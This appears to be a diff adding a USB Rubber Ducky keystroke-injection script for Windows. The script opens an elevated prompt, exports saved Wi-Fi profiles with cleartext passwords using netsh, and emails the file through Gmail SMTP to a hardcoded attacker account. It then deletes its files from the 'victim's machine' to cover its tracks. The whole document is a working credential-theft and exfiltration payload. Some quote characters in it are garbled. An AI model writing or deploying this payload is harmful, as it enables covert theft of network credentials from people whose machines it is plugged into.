@@ -1,0 +1,116 @@
+REM The following script will allow us to obtain network names and wifi passwords and export them via email
+DELAY 5000
+CONTROL ESCAPE
+DELAY 100
+STRING CMD
+DELAY 100
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 2000
+STRING cd/
+DELAY 300
+ENTER
+DELAY 100
+REM make a directory to export the network profiles to
+STRING mkdir wifi
+DELAY 100
+ENTER
+DELAY 100
+STRING cd wifi
+DELAY 100
+ENTER
+DELAY 100
+REM this command will export the profiles with the passwords in clear text
+REM each profile will be exported to a seperate .xml file, we will soon concatanate all these files
+STRING netsh wlan export profile key=clear
+DELAY 200
+ENTER
+DELAY 500
+REM this command will copy all the .xml files to one .txt file that we can export
+STRING copy *.xml wifi.txt
+DELAY 200
+ENTER
+DELAY 500
+STRING exit
+DELAY 100
+ENTER
+DELAY 500
+REM exit out of administrative command prompt to cover tracks
+CONTROL ESCAPE
+DELAY 100
+REM opens powershell for use of command line emailing
+STRING Powershell
+DELAY 1000
+ENTER
+DELAY 1000
+REM setting variables for the email and sending the email with the attachment
+STRING $emailSmtpServer = @smtp.gmail.com@;
+DELAY 100
+STRING $emailSmtpServerPort = @587@;
+DELAY 100
+STRING $emailSmtpUser = @rubberducky42069"gmail.com@;
+DELAY 100
+STRING $emailSmtpPass = @RubberDucky42069?@;
+DELAY 100
+STRING $emailMessage = New-Object System.Net.Mail.MailMessage;
+DELAY 100
+STRING $emailMessage.From = @Ducky420 <rubberducky42069"gmail.com>@;
+DELAY 100
+STRING $emailMessage.To.Add(@rubberducky42069"gmail.com@);
+DELAY 100
+STRING $emailMessage.Body = @See attachments@;
+DELAY 100
+STRING $SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );
+DELAY 200
+STRING $SMTPClient.EnableSsl = $true;
+DELAY 100
+STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );
+DELAY 150
+REM adding the attachment by providing full path to concatanated list of wifi networks and passwords
+STRING $attachment = @C:\wifi\wifi.txt@;
+DELAY 100
+STRING $emailMessage.Attachments.Add($attachment);
+DELAY 100
+STRING $SMTPClient.Send($emailMessage);
+DELAY 200
+ENTER
+DELAY 200
+STRING exit
+DELAY 100
+ENTER
+DELAY 300
+REM exit out of powershell to cover tracks
+CONTROL ESCAPE
+DELAY 150
+STRING CMD
+DELAY 100
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 2000
+STRING cd/
+DELAY 300
+ENTER
+DELAY 100
+REM delete the document we created
+STRING del wifi
+DELAY 150
+ENTER
+DELAY 100
+STRING y
+DELAY 100
+ENTER
+DELAY 100
+REM remove the entire directory from victim's machine
+STRING rmdir wifi
+DELAY 100
+ENTER
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
